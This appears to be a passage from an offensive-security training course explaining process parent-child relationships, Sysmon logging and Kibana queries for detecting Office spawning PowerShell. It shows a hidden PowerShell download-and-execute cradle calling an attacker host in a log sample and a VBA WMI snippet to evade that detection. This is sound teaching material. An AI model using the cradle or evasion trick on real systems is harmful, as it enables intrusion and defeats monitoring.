Processes have a one-to-many relationship, referred to as parent and children. When one process starts another, that new process is a child of the process that started it. A process may have many children, but only one parent. These relationships can be a good indicator of malicious activity on a system - this is a point that we won't dwell on too much throughout this course as we're still learning basic tradecraft, but we'll introduce the concept here.

In the example above, Microsoft Word started PowerShell to execute our payload. This created a relationship by which **powershell.exe** is a child of **winword.exe**. This isn't normal behaviour and highly suspicious.

[Sysmon](https://docs.microsoft.com/en-gb/sysinternals/downloads/sysmon) and other defensive products can log process creation events, which includes the details of the parent and child. Defenders can use this information to trigger alerts when "sensitive" applications create children.

```shell
ProcessId: 2308
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
User: DEV\bfarmer
ParentProcessId: 3684
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
```

### Finding the Needle

You can verify this behaviour using the Elastic installation in the lab.  In the main Snap Labs Dashboard, click the **Apps** link in the top menu and then click the monitor icon next to the Kibana App entry.  The credentials are **elastic**:**elastic**.

We can start by finding all the Process Creation events logged by Sysmon.  From the Kibana home page, expand the menu in the top-left and then select **Discover** underneath the **Analytics** header.

First, ensure that you have the **winlogbeat-*** index selected.

Then in the search box, enter:
```
event.module : sysmon and event.type : process_start
```

The number of events you get back will depend on how long your lab has been running.  I have about 3,000 results from the 8 hosts that are being logged.  You can start to appreciate the difficultly in finding specific malicious activity across an entire enterprise environment with hundreds or even thousands of machines.  For that reason, we need to narrow down the search with additional parameters.  Specifically, in this case, we're interested in instances where MS Office applications are the parent.  So we can add the following to the search:
```
and process.parent.executable : *EXCEL.EXE | *WINWORD.EXE | *POWERPNT.EXE
```

Essentially what we're doing here is only returning results where the parent process path ends with EXCEL.EXE OR WINWORD.EXE OR POWERPNT.EXE.  When writing these queries, there are several aspects a defender needs to think about.  Some that spring to mind are:

-   Does the query cover all eventualities of interest?
-   Are there edge cases that this will miss?
-   Is the query performant?

A simple way to break this particular relationship is to use the WMI Win32_Process class to create the process:

```vb
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```

In this instance, PowerShell will be a child of **WmiPrvSE.exe** rather than MS Word.
